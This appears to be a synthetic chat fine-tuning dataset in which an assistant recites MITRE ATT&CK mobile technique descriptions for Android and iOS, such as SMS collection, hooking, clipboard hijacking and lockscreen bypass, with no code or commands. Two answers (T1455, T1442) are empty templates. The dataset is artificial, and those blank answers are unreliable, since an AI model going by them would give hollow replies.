{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Manipulation' and with the Id: T1641 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Manipulation' and with the Id: T1641 is described as follows: Adversaries may insert, delete, or alter data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application, process, and the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SMS Messages' and with the Id: T1636.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SMS Messages' and with the Id: T1636.004 is described as follows: Adversaries may utilize standard operating system APIs to gather SMS messages. On Android, this can be accomplished using the SMS Content Provider. iOS provides no standard API to access SMS messages. If the device has been jailbroken or rooted, an adversary may be able to access [SMS Messages](https://attack.mitre.org/techniques/T1636/004) without the user\u2019s knowledge or approval. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Service' and with the Id: T1481 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Service' and with the Id: T1481 is described as follows: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Runtime API Hijacking' and with the Id: T1625.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Runtime API Hijacking' and with the Id: T1625.001 is described as follows: Adversaries may execute their own malicious payloads by hijacking the way an operating system runs applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur at later points in time. On Android, adversaries may overwrite the standard OS API library with a malicious alternative to hook into core functions to achieve persistence. By doing this, the adversary\u2019s code will be executed every time the overwritten API function is called by an app on the infected device.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit Baseband Vulnerability' and with the Id: T1455 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit Baseband Vulnerability' and with the Id: T1455 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials from Password Store' and with the Id: T1634 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials from Password Store' and with the Id: T1634 is described as follows: Adversaries may search common password storage locations to obtain user credentials. Passwords can be stored in several places on a device, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users to manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.. The systems targeted by this attack pattern are: iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hooking' and with the Id: T1617 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hooking' and with the Id: T1617 is described as follows: Adversaries may utilize hooking to hide the presence of artifacts associated with their behaviors to evade detection. Hooking can be used to modify return values or data structures of system APIs and function calls. This process typically involves using 3rd party root frameworks, such as Xposed or Magisk, with either a system exploit or pre-existing root access. By including custom modules for root frameworks, adversaries can hook system APIs and alter the return value and/or system data structures to alter functionality/visibility of various aspects of the system.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Install Insecure or Malicious Configuration' and with the Id: T1478 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Install Insecure or Malicious Configuration' and with the Id: T1478 is described as follows: An adversary could attempt to install insecure or malicious configuration settings on the mobile device, through means such as phishing emails or text messages either directly containing the configuration settings as an attachment, or containing a web link to the configuration settings. The device user may be tricked into installing the configuration settings through social engineering techniques (Citation: Symantec-iOSProfile).For example, an unwanted Certification Authority (CA) certificate could be placed in the device's trusted certificate store, increasing the device's susceptibility to adversary-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's network communication ([Eavesdrop on Insecure Network Communication](https://attack.mitre.org/techniques/T1439) and [Manipulate Device Communication](https://attack.mitre.org/techniques/T1463)).On iOS, malicious Configuration Profiles could contain unwanted Certification Authority (CA) certificates or other insecure settings such as unwanted proxy server or VPN settings to route the device's network traffic through an adversary's system. The device could also potentially be enrolled into a malicious Mobile Device Management (MDM) system (Citation: Talos-MDM).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File and Directory Discovery' and with the Id: T1420 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File and Directory Discovery' and with the Id: T1420 is described as follows: Adversaries may enumerate files and directories or search in specific device locations for desired information within a filesystem. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1420) during automated discovery to shape follow-on behaviors, including deciding if the adversary should fully infect the target and/or attempt specific actions. On Android, Linux file permissions and SELinux policies typically stringently restrict what can be accessed by apps without taking advantage of a privilege escalation exploit. The contents of the external storage directory are generally visible, which could present concerns if sensitive data is inappropriately stored there. iOS's security architecture generally restricts the ability to perform any type of [File and Directory Discovery](https://attack.mitre.org/techniques/T1420) without use of escalated privileges. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Obfuscated Files or Information' and with the Id: T1406 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Obfuscated Files or Information' and with the Id: T1406 is described as follows: Adversaries may attempt to make a payload or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the device or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.  Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Portions of files can also be encoded to hide the plaintext strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.(Citation: Microsoft MalLockerB) . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Input Injection' and with the Id: T1516 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Input Injection' and with the Id: T1516 is described as follows: A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.[Input Injection](https://attack.mitre.org/techniques/T1516) can be achieved using any of the following methods:* Mimicking user clicks on the screen, for example to steal money from a user's PayPal account.(Citation: android-trojan-steals-paypal-2fa)* Injecting global actions, such as `GLOBAL_ACTION_BACK` (programatically mimicking a physical back button press), to trigger actions on behalf of the user.(Citation: Talos Gustuff Apr 2019)* Inserting input into text fields on behalf of the user. This method is used legitimately to auto-fill text fields by applications such as password managers.(Citation: bitwarden autofill logins). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Denial of Service' and with the Id: T1464 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Denial of Service' and with the Id: T1464 is described as follows: Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth that services rely on, or by jamming the signal going to or coming from devices. A Network DoS will occur when an adversary is able to jam radio signals (e.g. Wi-Fi, cellular, GPS) around a device to prevent it from communicating. For example, to jam cellular signal, an adversary may use a handheld signal jammer, which jam devices within the jammer\u2019s operational range.(Citation: NIST-SP800187) Usage of cellular jamming has been documented in several arrests reported in the news.(Citation: CNET-Celljammer)(Citation: NYTimes-Celljam)(Citation: Digitaltrends-Celljam)(Citation: Arstechnica-Celljam). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Application Executable' and with the Id: T1577 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Application Executable' and with the Id: T1577 is described as follows: Adversaries may modify applications installed on a device to establish persistent access to a victim. These malicious modifications can be used to make legitimate applications carry out adversary tasks when these applications are in use.There are multiple ways an adversary can inject malicious code into applications. One method is by taking advantages of device vulnerabilities, the most well-known being Janus, an Android vulnerability that allows adversaries to add extra bytes to APK (application) and DEX (executable) files without affecting the file's signature. By being able to add arbitrary bytes to valid applications, attackers can seamlessly inject code into genuine executables without the user's knowledge.(Citation: Guardsquare Janus)Adversaries may also rebuild applications to include malicious modifications. This can be achieved by decompiling the genuine application, merging it with the malicious code, and recompiling it.(Citation: CheckPoint Agent Smith)Adversaries may also take action to conceal modifications to application executables and bypass user consent. These actions include altering modifications to appear as an update or exploiting vulnerabilities that allow activities of the malicious application to run inside a system application.(Citation: CheckPoint Agent Smith). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Event Triggered Execution' and with the Id: T1624 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Event Triggered Execution' and with the Id: T1624 is described as follows: Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities. Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via automatically and repeatedly executing malicious code. After gaining access to a victim\u2019s system, adversaries may create or modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Network Configuration Discovery' and with the Id: T1422 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Network Configuration Discovery' and with the Id: T1422 is described as follows: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of devices they access or through information discovery of remote systems. Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1422) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. On Android, details of onboard network interfaces are accessible to apps through the `java.net.NetworkInterface` class.(Citation: NetworkInterface) Previously, the Android `TelephonyManager` class could be used to gather telephony-related device identifiers, information such as the IMSI, IMEI, and phone number. However, starting with Android 10, only preloaded, carrier, the default SMS, or device and profile owner applications can access the telephony-related device identifiers.(Citation: TelephonyManager)  On iOS, gathering network configuration information is not possible without root access.  Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1422) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manipulate Device Communication' and with the Id: T1463 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manipulate Device Communication' and with the Id: T1463 is described as follows: If network traffic between the mobile device and a remote server is not securely protected, then an attacker positioned on the network may be able to manipulate network communication without being detected. For example, FireEye researchers found in 2014 that 68% of the top 1,000 free applications in the Google Play Store had at least one Transport Layer Security (TLS) implementation vulnerability potentially opening the applications' network traffic to adversary-in-the-middle attacks (Citation: FireEye-SSL).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Video Capture' and with the Id: T1512 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Video Capture' and with the Id: T1512 is described as follows: An adversary can leverage a device\u2019s cameras to gather information by capturing video recordings. Images may also be captured, potentially in specified intervals, in lieu of video files.   Malware or scripts may interact with the device cameras through an available API provided by the operating system. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1513) due to use of the device\u2019s cameras for video recording rather than capturing the victim\u2019s screen.  In Android, an application must hold the `android.permission.CAMERA` permission to access the cameras. In iOS, applications must include the `NSCameraUsageDescription` key in the `Info.plist` file. In both cases, the user must grant permission to the requesting application to use the camera. If the device has been rooted or jailbroken, an adversary may be able to access the camera without knowledge of the user.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'One-Way Communication' and with the Id: T1481.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'One-Way Communication' and with the Id: T1481.003 is described as follows: Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to a compromised system without receiving return output. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.  Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Deliver Malicious App via Authorized App Store' and with the Id: T1475 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Deliver Malicious App via Authorized App Store' and with the Id: T1475 is described as follows: Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.App stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:* [Download New Code at Runtime](https://attack.mitre.org/techniques/T1407)* [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1406)Adversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) (Citation: Percoco-Bouncer) (Citation: Wang)Adversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. (Citation: Oberheide-Bouncer)Adversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Encrypted for Impact' and with the Id: T1471 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Encrypted for Impact' and with the Id: T1471 is described as follows: An adversary may encrypt files stored on a mobile device to prevent the user from accessing them. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Prevent Application Removal' and with the Id: T1629.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Prevent Application Removal' and with the Id: T1629.001 is described as follows: Adversaries may abuse the Android device administration API to prevent the user from uninstalling a target application. In earlier versions of Android, device administrator applications needed their administration capabilities explicitly deactivated by the user before the application could be uninstalled. This was later updated so the user could deactivate and uninstall the administrator application in one step.Adversaries may also abuse the device accessibility APIs to prevent removal. This set of APIs allows the application to perform certain actions on behalf of the user and programmatically determine what is being shown on the screen. The malicious application could monitor the device screen for certain modals (e.g., the confirmation modal to uninstall an application) and inject screen input or a back button tap to close the modal. For example, Android's `performGlobalAction(int)` API could be utilized to prevent the user from removing the malicious application from the device after installation. If the user wants to uninstall the malicious application, two cases may occur, both preventing the user from removing the application.* Case 1: If the integer argument passed to the API call is `2` or `GLOBAL_ACTION_HOME`, the malicious application may direct the user to the home screen from settings screen * Case 2: If the integer argument passed to the API call is `1` or `GLOBAL_ACTION_BACK`, the malicious application may emulate the back press event . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Network Connections Discovery' and with the Id: T1421 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Network Connections Discovery' and with the Id: T1421 is described as follows: Adversaries may attempt to get a listing of network connections to or from the compromised device they are currently accessing or from remote systems by querying for information over the network.  This is typically accomplished by utilizing device APIs to collect information about nearby networks, such as Wi-Fi, Bluetooth, and cellular tower connections. On Android, this can be done by querying the respective APIs:  * `WifiInfo` for information about the current Wi-Fi connection, as well as nearby Wi-Fi networks. Querying the `WiFiInfo` API requires the application to hold the `ACCESS_FINE_LOCATION` permission. * `BluetoothAdapter` for information about Bluetooth devices, which also requires the application to hold several permissions granted by the user at runtime. * For Android versions prior to Q, applications can use the `TelephonyManager.getNeighboringCellInfo()` method. For Q and later, applications can use the `TelephonyManager.getAllCellInfo()` method. Both methods require the application hold the `ACCESS_FINE_LOCATION` permission.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Phishing' and with the Id: T1660 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Phishing' and with the Id: T1660 is described as follows: Adversaries may send malicious content to users in order to gain access to their mobile devices. All forms of phishing are electronically delivered social engineering. Adversaries can conduct both non-targeted phishing, such as in mass malware spam campaigns, as well as more targeted phishing tailored for a specific individual, company, or industry, known as \u201cspearphishing\u201d.  Phishing often involves social engineering techniques, such as posing as a trusted source, as well as evasion techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages.Mobile phishing may take various forms. For example, adversaries may send emails containing malicious attachments or links, typically to deliver and then execute malicious code on victim devices. Phishing may also be conducted via third-party services, like social media platforms.  Mobile devices are a particularly attractive target for adversaries executing phishing campaigns.  Due to their smaller form factor than traditional desktop endpoints, users may not be able to notice minor differences between genuine and phishing websites. Further, mobile devices have additional sensors and radios that allow adversaries to execute phishing attempts over several different vectors, such as: - SMS messages: Adversaries may send SMS messages (known as \u201csmishing\u201d) from compromised devices to potential targets to convince the target to, for example, install malware, navigate to a specific website, or enable certain insecure configurations on their device.- Quick Response (QR) Codes: Adversaries may use QR codes (known as \u201cquishing\u201d) to redirect users to a phishing website. For example, an adversary could replace a legitimate public QR Code with one that leads to a different destination, such as a phishing website. A malicious QR code could also be delivered via other means, such as SMS or email. In the latter case, an adversary could utilize a malicious QR code in an email to pivot from the user\u2019s desktop computer to their mobile device.- Phone Calls: Adversaries may call victims (known as \u201cvishing\u201d) to persuade them to perform an action, such as providing login credentials or navigating to a malicious website. This could also be used as a technique to perform the initial access on a mobile device, but then pivot to a computer/other network by having the victim perform an action on a desktop computer.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SSL Pinning' and with the Id: T1521.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SSL Pinning' and with the Id: T1521.003 is described as follows: Adversaries may use [SSL Pinning](https://attack.mitre.org/techniques/T1521/003)  to protect the C2 traffic from being intercepted and analyzed.[SSL Pinning](https://attack.mitre.org/techniques/T1521/003)  is a technique commonly utilized by legitimate websites to ensure that encrypted communications are only allowed with a pre-defined certificate. If another certificate is presented, it could indicate device compromise, traffic interception, or another upstream issue. While benign usages are common, it is also possible for adversaries to abuse this technology to protect malicious C2 traffic.In normal, not pinned SSL validation, when a client connects to a server using HTTPS, it typically checks whether the server\u2019s SSL/TLS certificate is signed by a trusted Certificate Authority (CA) in the device\u2019s trust store. If the certificate is valid and signed by a trusted CA, the connection is established. However, with [SSL Pinning](https://attack.mitre.org/techniques/T1521/003) , the client is configured to trust a specific SSL/TLS certificate or public key, rather than relying on the device\u2019s trust store. This means that even if the server\u2019s certificate is signed by a trusted CA, the client will only establish the connection of the certificate or key is pinned.There are two types of [SSL Pinning](https://attack.mitre.org/techniques/T1521/003) :1.\tCertificate Pinning: The client stores a copy of the server\u2019s certificate and compares it with the certificate received during the SSL handshake. If the certificates match, then the client proceeds with the connection. This approach also works with self-signed certificates.2.\tPublic Key Pinning: Instead of pinning the entire certificate, the client pins just the public key extracted from the certificate. This is often more flexible, as it allows the server to renew its certificate without having to update the pinned certificate or breaking the SSL connection.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Lockscreen Bypass' and with the Id: T1461 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Lockscreen Bypass' and with the Id: T1461 is described as follows: An adversary with physical access to a mobile device may seek to bypass the device\u2019s lockscreen. Several methods exist to accomplish this, including:* Biometric spoofing: If biometric authentication is used, an adversary could attempt to spoof a mobile device\u2019s biometric authentication mechanism. Both iOS and Android partly mitigate this attack by requiring the device\u2019s passcode rather than biometrics to unlock the device after every device restart, and after a set or random amount of time.(Citation: SRLabs-Fingerprint)(Citation: TheSun-FaceID)* Unlock code bypass: An adversary could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (\u201cshoulder surfing\u201d) the device owner\u2019s use of the lockscreen passcode. Mobile OS vendors partly mitigate this by implementing incremental backoff timers after a set number of failed unlock attempts, as well as a configurable full device wipe after several failed unlock attempts.* Vulnerability exploit: Techniques have been periodically demonstrated that exploit mobile devices to bypass the lockscreen. The vulnerabilities are generally patched by the device or OS vendor once disclosed.(Citation: Wired-AndroidBypass)(Citation: Kaspersky-iOSBypass). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command-Line Interface' and with the Id: T1605 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command-Line Interface' and with the Id: T1605 is described as follows: Adversaries may use built-in command-line interfaces to interact with the device and execute commands. Android provides a bash shell that can be interacted with over the Android Debug Bridge (ADB) or programmatically using Java\u2019s `Runtime` package. On iOS, adversaries can interact with the underlying runtime shell if the device has been jailbroken.If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Contact List' and with the Id: T1636.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Contact List' and with the Id: T1636.003 is described as follows: Adversaries may utilize standard operating system APIs to gather contact list data. On Android, this can be accomplished using the Contacts Content Provider. On iOS, this can be accomplished using the `Contacts` framework.  If the device has been jailbroken or rooted, an adversary may be able to access the [Contact List](https://attack.mitre.org/techniques/T1636/003) without the user\u2019s knowledge or approval. . The systems targeted by this attack pattern are: iOS, Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Local System' and with the Id: T1533 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Local System' and with the Id: T1533 is described as follows: Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to exfiltration.   Access to local system data, which includes information stored by the operating system, often requires escalated privileges. Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos. On Android, adversaries may also attempt to access files from external storage which may require additional storage-related permissions.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Account Access Removal' and with the Id: T1640 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Account Access Removal' and with the Id: T1640 is described as follows: Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access to accounts. . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Information Discovery' and with the Id: T1426 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Information Discovery' and with the Id: T1426 is described as follows: Adversaries may attempt to get detailed information about a device\u2019s operating system and hardware, including versions, patches, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1426) during automated discovery to shape follow-on behaviors, including whether or not to fully infects the target and/or attempts specific actions.  On Android, much of this information is programmatically accessible to applications through the `android.os.Build` class. (Citation: Android-Build) iOS is much more restrictive with what information is visible to applications. Typically, applications will only be able to query the device model and which version of iOS it is running. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Fake Developer Accounts' and with the Id: T1442 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Fake Developer Accounts' and with the Id: T1442 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clipboard Modification' and with the Id: T1510 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clipboard Modification' and with the Id: T1510 is described as follows: Adversaries may abuse clipboard functionality to intercept and replace information in the Android device clipboard.(Citation: ESET Clipboard Modification February 2019)(Citation: Welivesecurity Clipboard Modification February 2019)(Citation: Syracuse Clipboard Modification 2014) Malicious applications may monitor the clipboard activity through the <code>ClipboardManager.OnPrimaryClipChangedListener</code> interface on Android to determine when the clipboard contents have changed.(Citation: Dr.Webb Clipboard Modification origin2 August 2018)(Citation: Dr.Webb Clipboard Modification origin August 2018) Listening to clipboard activity, reading the clipboard contents, and modifying the clipboard contents requires no explicit application permissions and can be performed by applications running in the background, however, this behavior has changed with the release of Android 10.(Citation: Android 10 Privacy Changes)Adversaries may use [Clipboard Modification](https://attack.mitre.org/techniques/T1510) to replace text prior to being pasted, for example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.[Clipboard Modification](https://attack.mitre.org/techniques/T1510) had been seen within the Android/Clipper.C trojan. This sample had been detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.(Citation: ESET Clipboard Modification February 2019). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Archive Collected Data' and with the Id: T1532 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Archive Collected Data' and with the Id: T1532 is described as follows: Adversaries may compress and/or encrypt data that is collected prior to exfiltration. Compressing data can help to obfuscate its contents and minimize use of network resources. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.  Both compression and encryption are done prior to exfiltration, and can be performed using a utility, programming library, or custom algorithm.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
